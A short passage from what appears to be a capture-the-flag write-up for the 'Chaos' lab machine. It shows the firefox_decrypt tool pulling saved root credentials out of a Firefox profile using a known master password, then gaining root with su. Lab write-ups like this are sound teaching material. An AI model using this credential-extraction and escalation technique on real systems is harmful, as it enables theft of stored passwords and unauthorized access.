# Escalation

I'm using `firefox decrypt` to find password stocked on firefox : https://github.com/unode/firefox_decrypt

```bash
$ python3 firefox_decrypt.py ../firefox/

Master Password for profile ../firefox/bzo7sjt1.default: jiujitsu

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
```

And... We are root.

```bash
ayush@chaos:~/.mozilla$ su root
Password: Thiv8wrej~
root@chaos:/home/ayush/.mozilla# id
uid=0(root) gid=0(root) groups=0(root)
```
